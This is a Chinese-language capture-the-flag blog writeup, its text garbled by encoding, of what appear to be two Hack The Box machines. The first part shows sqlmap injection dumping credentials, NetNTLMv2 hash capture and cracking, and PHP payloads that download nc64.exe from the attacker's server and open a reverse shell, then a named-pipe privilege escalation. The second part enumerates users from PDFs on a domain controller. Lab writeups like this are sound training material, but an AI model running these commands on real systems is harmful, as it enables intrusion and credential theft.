Microsoft-IIS/10.0 |_http-title: OS Tidy Inc. Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete No OS matches for host Network Distance: 2 hops Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 240.14 ms 10.10.14.1 2 240.16 ms 10.10.10.231 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 389.51 seconds ä»nmapæ‰«ææˆ‘ä»¬å¯ä»¥å¾—åˆ°çš„ä¿¡æ¯æœ‰ - æœ¬å°é¶æœºå¼€å¯äº†80ç«¯å£ - æœ¬å°é¶æœºä½¿ç”¨äº†IIS 10.0ä½œä¸ºWebæœåŠ¡å™¨ - æœ¬å°é¶æœºæ˜¯Windowsç³»ç»Ÿ è¿™å°é¶æœºåªå¼€å¯äº†80ç«¯å£ï¼Œé‚£è¿™åº”è¯¥å°±æ˜¯æˆ‘ä»¬å”¯ä¸€çš„çªç ´å£äº†ï¼Œè®©æˆ‘ä»¬å…ˆæ¥è®¿é—®ä¸€ä¸‹çœ‹çœ‹å§ åœ¨ä¸»é¡µé¢æˆ‘ä»¬æ²¡å‘ç°ä»€ä¹ˆæœ‰è¶£çš„ä¸œè¥¿ï¼Œé‚£å°±å…ˆFUZZä¸€ä¸‹ç›®å½•çœ‹çœ‹å§ gobuster dir -u http://10.10.10.231/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 50 â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# gobuster dir -u http://10.10.10.231/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 200 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.231/ [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php,html,txt [+] Timeout: 10s =============================================================== 2021/07/10 14:01:21 Starting gobuster in directory enumeration mode =============================================================== /Index.html (Status: 200) [Size: 14257] /assets (Status: 301) [Size: 150] [--&gt; http://10.10.10.231/assets/] /functions.php (Status: 200) [Size: 0] /index.html (Status: 200) [Size: 14257] /index.html (Status: 200) [Size: 14257] /licenses (Status: 301) [Size: 152] [--&gt; http://10.10.10.231/licenses/] =============================================================== 2021/07/10 14:01:46 Finished =============================================================== æˆ‘ä»¬å‘ç°äº†ä¸¤ä¸ªç›®å½•assetsã€licenseså’Œä¸€ä¸ªæ–‡ä»¶functions.php å’±ä»¬æŠŠè¿™ä¸¤ä¸ªç›®å½•ç»§ç»­fuzzï¼Œç„¶åå»çœ‹çœ‹è¿™ä¸ªphpæ–‡ä»¶é‡Œæœ‰ä»€ä¹ˆ http://10.10.10.231/ index.php functions.php /assets /api /css /fonts /img /js /licenses index.php logout.php licenses.php è®¿é—®åå‘ç°ï¼Œfunctions.phpæ˜¯ç©ºç™½é¡µé¢ï¼Œæ²¡æœ‰å¯è®¿é—®çš„å†…å®¹ã€‚è®¿é—®/assetså’Œ/assets/apiéƒ½æ˜¯è¿”å›404ï¼Œæš‚æ—¶æ— æ³•è®¿é—®ã€‚è€Œè®¿é—®/licensesåï¼Œæ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œè®¿é—®/licenses/licenses.phpä¼šè·³è½¬åˆ°/licenses/index.phpé¡µé¢ åœ¨http://10.10.10.231/index.phpç½‘é¡µæºä»£ç çš„æ—¶å€™ï¼Œæ‰¾åˆ°äº†ä¸¤ä¸ªæœ‰æ„æ€çš„ä¸œè¥¿ å››ä¸ªç”¨æˆ·å - dustin - daksh - anna - wafer ä¸€æ®µURLï¼Œå’±ä»¬è®¿é—®ä¸€ä¸‹è¯•è¯• http://10.10.10.231/products-ajax.php?order=id+desc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b è®¿é—®åå‘ç°æ˜¯index.phpé¡µé¢çš„å•†åº—åŠŸèƒ½ æµ‹è¯•åå‘ç°ï¼Œä¸Šè¿°urlä¸­ï¼Œç¼ºå°‘äº†orderæˆ–è€…hè¿™ä¸¤ä¸ªä»»æ„ä¸€ä¸ªå‚æ•°ï¼Œéƒ½ä¼šå¾—åˆ°å¦‚ä¸‹æŠ¥é”™ æˆ‘æœ‰ç‚¹å¥½å¥‡è¿™æ®µhashçš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Œå’±ä»¬ä½¿ç”¨johnç»™å®ƒè§£å¯†ä¸€ä¸‹ æµ‹è¯•å¾—åˆ°HASHç®—æ³• Hash = md5(Salt+Payload) â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# john hash --wordlist=/usr/share/wordlists/rockyou.txt Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;dynamic=md5($p)&quot; Use the &quot;--format=dynamic=md5($p)&quot; option to force loading these as that type instead Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;HAVAL-128-4&quot; Use the &quot;--format=HAVAL-128-4&quot; option to force loading these as that type instead Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;MD2&quot; Use the &quot;--format=MD2&quot; option to force loading these as that type instead Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;mdc2&quot; Use the &quot;--format=mdc2&quot; option to force loading these as that type instead Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;mscash&quot; Use the &quot;--format=mscash&quot; option to force loading these as that type instead Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;mscash2&quot; Use the &quot;--format=mscash2&quot; option to force loading these as that type instead Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;NT&quot; Use the &quot;--format=NT&quot; option to force loading these as that type instead Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;Raw-MD4&quot; Use the &quot;--format=Raw-MD4&quot; option to force loading these as that type instead Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;Raw-MD5&quot; Use the &quot;--format=Raw-MD5&quot; option to force loading these as that type instead Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;Raw-MD5u&quot; Use the &quot;--format=Raw-MD5u&quot; option to force loading these as that type instead Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;Raw-SHA1-AxCrypt&quot; Use the &quot;--format=Raw-SHA1-AxCrypt&quot; option to force loading these as that type instead Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;ripemd-128&quot; Use the &quot;--format=ripemd-128&quot; option to force loading these as that type instead Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;Snefru-128&quot; Use the &quot;--format=Snefru-128&quot; option to force loading these as that type instead Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;ZipMonster&quot; Use the &quot;--format=ZipMonster&quot; option to force loading these as that type instead Using default input encoding: UTF-8 Using default target encoding: CP850 Loaded 2 password hashes with no different salts (LM [DES 256/256 AVX2]) Warning: poor OpenMP scalability for this hash type, consider --fork=2 Will run 2 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status 0g 0:00:00:01 DONE (2021-07-10 14:44) 0g/s 9808Kp/s 9808Kc/s 19617KC/s !!LIVER..*7Â¡VA Session completed çœ‹åˆ°è¿™é‡Œï¼Œçªç„¶å°±æƒ³é€šä¸ºä»€ä¹ˆä¼šæŠŠè¿™æ®µhashæ’å…¥åˆ°orderé‡Œäº† æ¼æ´åˆ©ç”¨ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œæ³¨å…¥ sqlmap -u &quot;http://10.10.10.231/products-ajax.php?order=id+desc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b&quot; --eval=&quot;import hashlib ; h=hashlib.md5((&#39;hie0shah6ooNoim&#39;+order).encode(&#39;utf-8&#39;)).hexdigest()&quot; --batch --threads=10 -D cleaner -T customers -C id,login,password --dump å¾—åˆ°äº†ç»“æœ +----+------------------------------+----------------------------------------------+ | id | login | password | +----+------------------------------+----------------------------------------------+ | 1 | vikki.solomon@throwaway.mail | 7c6a180b36896a0a8c02787eeafb0e4c (password1) | | 2 | nstone@trashbin.mail | 6cb75f652a9b52798eb6cf2201057c73 (password2) | | 3 | bmceachern7@discovery.moc | e10adc3949ba59abbe56e057f20f883e (123456) | | 4 | jkleiser8@google.com.xy | 827ccb0eea8a706c4c34a16891f84e7b (12345) | | 5 | mchasemore9@sitemeter.moc | 25f9e794323b453885f5181f1b624d0b (123456789) | | 6 | gdornina@marriott.moc | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | | 7 | itootellb@forbes.moc | f25a2fc72690b780b2a14e140ef6a9e0 (iloveyou) | | 8 | kmanghamc@state.tx.su | 8afa847f50a716e64932d995c8e7435a (princess) | | 9 | jblinded@bing.moc | fcea920f7412b5da7be0cf42b8c93759 (1234567) | | 10 | llenchenkoe@macromedia.moc | f806fc5a2a0d5ba2471600758452799c (rockyou) | | 11 | aaustinf@booking.moc | 25d55ad283aa400af464c76d713c07ad (12345678) | | 12 | afeldmesserg@ameblo.pj | e99a18c428cb38d5f260853678922e03 (abc123) | | 13 | ahuntarh@seattletimes.moc | fc63f87c08d505264caba37514cd0cfd (nicole) | | 14 | talelsandrovichi@tamu.ude | aa47f8215c6f30a0dcdb2a36a9f4168e (daniel) | | 15 | ishayj@dmoz.gro | 67881381dbc68d4761230131ae0008f7 (babygirl) | | 16 | acallabyk@un.gro | d0763edaa9d9bd2a9516280e9044d885 (monkey) | | 17 | daeryl@about.you | 061fba5bdfc076bb7362616668de87c8 (lovely) | | 18 | aalekseicikm@skyrock.moc | aae039d6aa239cfc121357a825210fa3 (jessica) | | 19 | lginmann@lycos.moc | c33367701511b4f6020ec61ded352059 (654321) | | 20 | lgiorioo@ow.lic | 0acf4539a14b3aa27deeb4cbdf6e989f (michael) | | 21 | lbyshp@wired.moc | adff44c5102fca279fce7559abf66fee (ashley) | | 22 | bklewerq@yelp.moc | d8578edf8458ce06fbc5bb76a58c5ca4 (qwerty) | | 23 | wstrettellr@senate.gov | 96e79218965eb72c92a549dd5a330112 (111111) | | 24 | lodorans@kickstarter.moc | edbd0effac3fcc98e725920a512881e0 (iloveu) | | 25 | bpfeffelt@artisteer.moc | 670b14728ad9902aecba32e22fa4f6bd (000000) | | 26 | lgrimsdellu@abc.net.uvw | 2345f10bb948c5665ef91f6773b3e455 (michelle) | | 27 | lpealingv@goo.goo | f78f2477e949bee2d12a2c540fb6084f (tigger) | | 28 | krussenw@mit.ude | 0571749e2ac330a7455809c6b0e7af90 (sunshine) | | 29 | meastmondx@businessweek.moc | c378985d629e99a4e86213db0cd5e70d (chocolate) | +----+------------------------------+----------------------------------------------+ éšä¾¿é€‰æ‹©ä¸€ä¸ªè´¦å·è¿›è¡Œç™»å½• ç™»å…¥åï¼Œåœ¨æºç å¤„å‘ç°äº†æœ‰è¶£çš„ä¸œè¥¿ å’±ä»¬æŠŠthemeæ›´æ”¹ä¸º..å¹¶ç”Ÿæˆç›¸å¯¹åº”çš„hashå€¼ http://10.10.10.231/licenses/licenses.php?theme=..&amp;h=c5427f8e0865273f4a62c614adec0985 hashç”Ÿæˆè„šæœ¬ import hashlib m = hashlib.md5() # b&quot;hie0shah6ooNoimåè¾¹çš„`..`å°±æ˜¯æˆ‘ä»¬çš„è‡ªå®šä¹‰payload m.update(b&quot;hie0shah6ooNoim..&quot;) print(m.hexdigest()) å‘ç°æ³¨é‡Šé‡Œæœ‰ä¸€äº›æè¿° å’±ä»¬å°è¯•ä¸€ä¸‹RFI(Remote File Inclusion è¿œç¨‹æ–‡ä»¶åŒ…å«) ä½¿ç”¨pythonè‡ªå¸¦çš„smbserver.pyæ¨¡å—å¼€å¯ä¸€ä¸ªè™šå‡çš„smbæœåŠ¡ python3 /usr/share/doc/python3-impacket/examples/smbserver.py -ip 10.10.14.24 -smb2support evil . http://10.10.10.231/licenses/licenses.php?theme=//10.10.14.24&amp;h=288af3998fba7f4c3fd8e58be73b26ae â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# python3 /usr/share/doc/python3-impacket/examples/smbserver.py -ip 10.10.14.24 -smb2support evil . Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed [*] Incoming connection (10.10.10.231,51415) [*] AUTHENTICATE_MESSAGE (PROPER\\web,PROPER) [*] User PROPER\\web authenticated successfully [*] web::PROPER:4141414141414141:e73cd0da1ecd6a53908ce1117b61d53c:010100000000000000379e157675d70156bee2cc93aced8e000000000100100054006e00520063006e006a006e0063000300100054006e00520063006e006a006e0063000200100055004500650052004a004e006f004f000400100055004500650052004a004e006f004f000700080000379e157675d70106000400020000000800300030000000000000000000000000200000cc94dbb5a4a8ccad357314b70a1060b2abd390224562589501139c5005a818470a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320034000000000000000000 [*] Handle: &#39;ConnectionResetError&#39; object is not subscriptable [*] Closing down connection (10.10.10.231,51415) [*] Remaining connections [] æˆåŠŸè·å–åˆ°ä¸€ä¸ªhashï¼Œå’±ä»¬ä¸¢åˆ°johné‡Œè¿›è¡Œç ´è§£ â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# john --show --format=netntlmv2 hash web:charlotte123!:PROPER:4141414141414141:e73cd0da1ecd6a53908ce1117b61d53c:010100000000000000379e157675d70156bee2cc93aced8e000000000100100054006e00520063006e006a006e0063000300100054006e00520063006e006a006e0063000200100055004500650052004a004e006f004f000400100055004500650052004a004e006f004f000700080000379e157675d70106000400020000000800300030000000000000000000000000200000cc94dbb5a4a8ccad357314b70a1060b2abd390224562589501139c5005a818470a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320034000000000000000000 1 password hash cracked, 0 left æˆåŠŸè·å¾—äº†ä¸€ä¸ªè´¦æˆ·å¯†ç  username = web password = charlotte123! ä½¿ç”¨è´¦å·å¯†ç é‡æ–°æ‰§è¡ŒsmbæœåŠ¡ python3 /usr/share/doc/python3-impacket/examples/smbserver.py -ip 10.10.14.24 -username web -password charlotte123! -smb2support eval . åœ¨æœ¬åœ°ç¼–å†™ä¸€ä¸ªæ¡ä»¶ç«äº‰çš„shè„šæœ¬ï¼Œä¿å­˜ä¸ºrace.sh #!/bin/bash PAYLOAD=$1 while :; do echo hello world &gt; header.inc echo &quot;$PAYLOAD&quot; &gt; header.inc done ç„¶åè¿è¡Œè„šæœ¬ ./race.sh &#39;&lt;?php phpinfo(); ?&gt;&#39; ç„¶åå†æ¬¡è¯·æ±‚ç½‘é¡µ http://10.10.10.231/licenses/licenses.php?theme=//10.10.14.24/evil&amp;h=d1a79488ed1966002feef92cabc0ccc8 æˆåŠŸè¿”å›äº†phpinfoç•Œé¢ å¯èƒ½ä¸€æ¬¡ä¸è¡Œï¼Œå¤šåˆ·æ–°å‡ æ¬¡ ç°åœ¨å’±ä»¬åœ¨æœ¬åœ°æ”¾ä¸€ä¸ªnetcat.exeï¼Œä¸Šä¼ åˆ°é¶æœºé‡Œæ¥åå¼¹shell é¦–å…ˆä½¿ç”¨Python3åœ¨æœ¬åœ°å¼€å¯ä¸€ä¸ªhttpæœåŠ¡å™¨ python3 -m http.server 80 ç„¶åè¿è¡Œè„šæœ¬ ./race.sh &#39;&lt;?php system(&quot;cmd /c powershell iwr http://10.10.14.24/nc64.exe -outf \\windows\\system32\\spool\\drivers\\color\\cute.exe&quot;); ?&gt;&#39; â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 5555 (http://0.0.0.0:5555/) ... 10.10.10.231 - - [11/Jul/2021 09:06:05] &quot;GET /nc64.exe HTTP/1.1&quot; 200 - æ¥æ”¶åˆ°GETè¯·æ±‚å°±æ˜¯æ‰§è¡ŒæˆåŠŸäº†ï¼Œç°åœ¨æˆ‘ä»¬ä½¿ç”¨ncåœ¨æœ¬åœ°ç›‘å¬ä¸€ä¸ªç«¯å£ nc -nvlp 4444 ç„¶ååˆ©ç”¨æˆ‘ä»¬åˆšæ‰ä¸Šä¼ çš„nc64.exeæ¥åå¼¹shell ./race.sh &#39;&lt;?php system(&quot;cmd /c start \\windows\\system32\\spool\\drivers\\color\\cute.exe 10.10.14.24 4444 -e cmd.exe&quot;); ?&gt;&#39; æˆåŠŸå¼¹å›shell c:\\Users\\web\\Desktop&gt;type user.txt type user.txt 48129e580da3dc57a121551b897d1f5a æˆåŠŸæ‹¿åˆ°useræƒé™çš„flag ## æƒé™æå‡ è¿›å…¥ c:\\Program Files\\Cleanup&gt;dir dir Volume in drive C has no label. Volume Serial Number is FE0C-A36B Directory of c:\\Program Files\\Cleanup 11/15/2020 05:05 AM &lt;DIR&gt; . 11/15/2020 05:05 AM &lt;DIR&gt; .. 11/15/2020 05:03 AM 2,999,808 client.exe 11/15/2020 10:22 AM 174 README.md 11/15/2020 06:20 AM 3,041,792 server.exe 3 File(s) 6,041,774 bytes 2 Dir(s) 7,353,192,448 bytes free æˆ‘åœ¨C:Filesclient.exeå’Œserver.exe è¿™å°±æ˜¯å’±ä»¬ææƒçš„çªç ´å£äº† mklink /j \\users\\web\\downloads\\lucifiel \\users\\administrator\\desktop å…ˆåšä¸€ä¸ªé“¾æ¥ æ“æ§ç®¡é“\\\\.\\pipe\\cleanuppipe echo CLEAN \\users\\web\\downloads\\lucifiel\\root.txtx &gt; \\\\.\\pipe\\cleanuppipe æ­¤æ—¶Server.exeä¼šé€šè¿‡ç®¡é“çš„å†…å®¹æ¥è¿è¡Œç¨‹åº, ä¼šå°†ç¨‹åºåŠ å¯†å¹¶ç§»åŠ¨è‡³\\programdata\\cleanup(è¿™ä¸ªç¨‹åºåº”è¯¥æ˜¯administratorè¿è¡Œçš„) åˆ æ‰é“¾æ¥, åˆ›å»ºæ–‡ä»¶å¤¹, å†è¿˜åŸæ–‡ä»¶ rmdir \\users\\web\\downloads\\lucifiel mkdir \\users\\web\\downloads\\lucifiel echo RESTORE \\users\\web\\downloads\\lucifiel\\root.txtx &gt; \\\\.\\pipe\\cleanuppipe type \\users\\web\\downloads\\lucifiel\\root.txt 9b07cf2c755f11c5545475416fb3a74f æˆåŠŸè·å¾—rootæƒé™çš„flag PSï¼šé€†å‘è¿™å—å„¿æˆ‘ä¸ä¼šï¼Œæˆ‘ç›´æ¥æŠ„çš„ç­”æ¡ˆ ä¸‹é¢è´´ä¸Šæˆ‘æŠ„çš„ç­”æ¡ˆçš„åŸæ–‡ Analysis of client.exeReverse engineering of client.exe shows the need to supply an argument in order to â€œmake it do somethingâ€. You can see from above that by supplying a -R and a file path triggers the main_serviceRestore function which in turn calls upon a named pipe client to connect to a named pipe, cleanupPipe. Further down the control flow graph, this is whatâ€™s actually sent across the named pipe. Analysis of server.exe Suppose we replicate the behaviors of client.exe and server.exe in a Windows 10 installation. This is what we have determined above This is whatâ€™s displayed in server.exe. Hmm, where have I seen C:before? By the way, dGVzdA&#x3D;&#x3D; is the base64-encoded string of test. On top of that, this is evidence that a named pipe, cleanupPipe is listening for data. We can send our own data to server.exe with good olâ€™ command prompt using the echo command like so. Meanwhile in server.exe, I see thisâ€¦ Somethingâ€™s not right. One character is truncated. In any case, all I have to do is to add one more character behind the path. Well, this is what happened. CLEAN removes the file specified in the file path and move it to C: and its content encrypted with AES-GCM. Conversely, RESTORE restores the file back to the original file path by decrypting the file contents and decoding the file path.","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Intelligence - Hackthebox","slug":"Hackthebox - Intelligence","date":"2021-07-07T11:38:36.000Z","updated":"2023-05-20T01:54:29.000Z","comments":true,"path":"2021/07/07/Hackthebox - Intelligence/","link":"","permalink":"http://www.lucifiel.com/2021/07/07/Hackthebox%20-%20Intelligence/","excerpt":"","text":"Hackthebox - Intelligenceé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†é¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# nmap -A -sS -sC -sV -p- 10.10.10.248 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-07 09:27 CST Nmap scan report for 10.10.10.248 Host is up (0.24s latency). Not shown: 65515 filtered ports PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Intelligence 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-07 08:49:30Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 |_ssl-date: 2021-07-07T08:51:09+00:00; +7h12m23s from scanner time. 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 |_ssl-date: 2021-07-07T08:51:10+00:00; +7h12m23s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 |_ssl-date: 2021-07-07T08:51:09+00:00; +7h12m23s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 |_ssl-date: 2021-07-07T08:51:10+00:00; +7h12m23s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49666/tcp open msrpc Microsoft Windows RPC 49677/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49678/tcp open msrpc Microsoft Windows RPC 49688/tcp open msrpc Microsoft Windows RPC 49700/tcp open msrpc Microsoft Windows RPC 58859/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete No OS matches for host Network Distance: 2 hops Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 7h12m22s, deviation: 0s, median: 7h12m22s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2021-07-07T08:50:31 |_ start_date: N/A TRACEROUTE (using port 139/tcp) HOP RTT ADDRESS 1 241.20 ms 10.10.14.1 2 241.20 ms 10.10.10.248 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 648.79 seconds åœ¨ä¸Šé¢æˆ‘ä»¬å¾—åˆ°çš„é‡è¦ä¿¡æ¯æœ‰ï¼š å¼€å¯80ç«¯å£çš„HTTPæœåŠ¡ å¼€å¯SMBæœåŠ¡ æœ‰ä¸¤ä¸ªåŸŸåintelligence.htbå’Œdc.intelligence.htb æœ‰Kerberoså¯èƒ½æ¶‰åŠå†…ç½‘æ¸—é€ å’±ä»¬ä¸€ä¸ªä¸€ä¸ªæ¥çœ‹ï¼Œé¦–å…ˆå…ˆæŠŠåŸŸåæ·»åŠ åˆ°hostsé‡Œ echo 10.10.10.248 dc.intelligence.htb intelligence.htb &gt; /etc/hosts ç„¶åå’±ä»¬å»æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸¤ä¸ªåŸŸå è¿™ä¸¤ä¸ªåŸŸåçš„å†…å®¹ä¼¼ä¹æ˜¯ä¸€æ ·çš„ï¼Œæ‰¾åˆ°äº†ä¸¤ä¸ªPDFæ–‡ä»¶ http://intelligence.htb/documents/2020-12-15-upload.pdf http://intelligence.htb/documents/2020-01-01-upload.pdf ç¿»è¯‘åæ²¡çœ‹åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œä½†æ¯•ç«Ÿæ˜¯PDFæ–‡ä»¶ï¼Œå’±ä»¬ä½¿ç”¨exiftoolè¿›è¡ŒæŸ¥çœ‹ exiftool 2020-01-01-upload.pdf exiftool 2020-12-15-upload.pdf åœ¨PDFæ–‡ä»¶ä¸­è¯»å–åˆ°äº†ä¸€ä¸ªåä¸ºCreatorçš„å­—æ®µï¼Œè¿™ä¸ªä¸€èˆ¬ä¸æ˜¯æ­£å¸¸æƒ…å†µï¼Œå…ˆè®°å½•ä¸€ä¸‹å§ã€‚ William.Lee Jose.Williams è¿™ä¸ªå¯èƒ½æ˜¯ä¸¤ä¸ªç”¨æˆ·å æˆ‘ä»¬è§‚å¯Ÿä¸€ä¸‹è¿™ä¸¤ä¸ªpdfæ–‡ä»¶çš„å‘½åè§„åˆ™ï¼Œä¼šå‘ç°ï¼Œå˜åŠ¨çš„åªæœ‰æ—¥æœŸã€‚é‚£ä¹ˆï¼Œæ˜¯å¦è¿˜æœ‰å…¶ä»–çš„pdfæ–‡ä»¶å‘¢ï¼Ÿè®©æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹ å¯ä»¥çœ‹åˆ°ï¼Œç¡®å®æ˜¯å­˜åœ¨çš„ã€‚ ç„¶åï¼Œæˆ‘æ‰¾åˆ°äº†ä¸€ä¸ªè„šæœ¬ï¼Œæ„Ÿè°¢kavigihanå¸ˆå‚…å†™çš„è„šæœ¬ #!/usr/bin/python3 # Author: kavigihan import requests import os def fuzz_PDFs(): with open(&#39;days&#39;, &#39;r&#39;) as d: days = d.readlines() with open(&#39;months&#39; ,&#39;r&#39;) as m: months = m.readlines() url_file = open(&#39;urls&#39;, &#39;w&#39;) url_file.close() for month in months: for day in days: r = requests.get(f&#39;http://dc.intelligence.htb/documents/2020-{day.strip()}-{month.strip()}-upload.pdf&#39;) if int(r.status_code) == 200: print(f&#39;http://dc.intelligence.htb/documents/2020-{day.strip()}-{month.strip()}-upload.pdf&#39;) with open(&#39;urls&#39;, &#39;a&#39;) as url_file: url_file.write(f&#39;http://dc.intelligence.htb/documents/2020-{day.strip()}-{month.strip()}-upload.pdf&#39;) url_file.write(&#39;\\n&#39;) def get_PDFs(): with open(&#39;urls&#39;, &#39;r&#39;) as u: urls = u.readlines() for url in urls: os.system(f&quot;wget -q {url.strip()} &quot;) print(f&#39;[+] Downloading -- {url.strip()} &#39;) fuzz_PDFs() get_PDFs() ä¿å­˜åˆ°æœ¬åœ°ï¼Œç„¶åç”Ÿæˆä¸¤ä¸ªå­—å…¸ seq 1 31 &gt; days; seq 1 12 &gt; months è®°å¾—æ‰‹åŠ¨åœ¨ç”Ÿæˆå‡ºæ¥çš„å­—å…¸å†…ï¼ŒæŠŠ1-9æ·»åŠ ä¸Š0ï¼Œæ¯”å¦‚1æœˆå°±æ”¹ä¸º01æœˆ ç„¶åæ‰§è¡Œè¯¥è„šæœ¬ python3 exploit.py ä½¿ç”¨å‘½ä»¤ cat *.pdf|strings |grep Creator|cut -d &#39;(&#39; -f 2|cut -d &#39;)&#39; -f 1|grep -v TeX &gt; users;cat users ææƒpdfæ–‡ä»¶å†…çš„ç”¨æˆ·å â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# cat *.pdf|strings |grep Creator|cut -d &#39;(&#39; -f 2|cut -d &#39;)&#39; -f 1|grep -v TeX &gt; users;cat users William.Lee Scott.Scott Jason.Wright Veronica.Patel Jose.Williams Brian.Morris Jennifer.Thomas Thomas.Valenzuela David.Mcbride Jose.Williams Anita.Roberts Brian.Baker Jose.Williams David.Mcbride David.Reed Kaitlyn.Zimmerman Jason.Patterson Thomas.Valenzuela David.Mcbride Darryl.Harris David.Wilson Scott.Scott Teresa.Williamson John.Coleman Samuel.Richardson Ian.Duncan Jason.Wright Travis.Evans David.Mcbride Jessica.Moody Ian.Duncan Anita.Roberts Kaitlyn.Zimmerman Jose.Williams Stephanie.Young Samuel.Richardson Tiffany.Molina Ian.Duncan æ¥ç€åœ¨æ–‡ä»¶2020-06-04-upload.pdfä¸­å‘ç°äº†ä¸€ä¸ªé»˜è®¤å¯†ç  New Account Guide Welcome to Intelligence Corp! Please login using your username and the default password of: NewIntelligenceCorpUser9876 After logging in please change your password as soon as possible. ä½¿ç”¨exiftoolæŸ¥çœ‹è¯¥pdfï¼Œè·å¾—äº†ç”¨æˆ·åJason.Pattersonï¼Œè¿™æ 